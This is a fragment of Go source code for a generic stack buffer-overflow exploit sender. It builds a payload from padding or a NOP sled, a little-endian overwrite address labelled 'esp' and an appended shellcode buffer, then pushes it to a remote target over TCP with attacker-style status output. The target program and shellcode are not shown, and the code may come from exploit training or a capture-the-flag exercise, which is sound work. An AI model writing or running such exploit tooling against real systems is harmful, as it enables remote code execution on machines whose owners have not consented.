func makePadding(offset int, ch byte) []byte {
	if offset <= 0 {
		return nil
	}
	out := make([]byte, offset)
	for i := range out {
		out[i] = ch
	}
	return out
}

func makeNOPPadding(size int) []byte {
	padding := make([]byte, size)
	for i := range padding {
		padding[i] = 0x90
	}
	return padding
}

func preview(b []byte, max int) (string, string) {
	if max > len(b) {
		max = len(b)
	}
	return strings.ToUpper(hex.EncodeToString(b[:max])), fmt.Sprintf("%q", b[:max])
}

func buildPayload(offset int, padchar byte, addr uint32, withNL bool, buf []byte) []byte {
	padding := makePadding(offset, padchar)
	if padding == nil {
		padding = makeNOPPadding(16)
	}

	esp := make([]byte, 4)
	binary.LittleEndian.PutUint32(esp, addr)

	payload := append(padding, esp...)
	payload = append(payload, buf...)
	if withNL {
		payload = append(payload, '\n')
	}
	return payload
}

func sendPayload(target string, payload []byte) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Connection failed: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Printf("[+] Connected to %s — sending %d bytes\n", target, len(payload))

	total := 0
	for total < len(payload) {
		n, err := conn.Write(payload[total:])
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Write error: %v\n", err)
			os.Exit(1)
		}
		total += n
	}
	fmt.Printf("[+] Sent %d bytes successfully.\n", total)
}

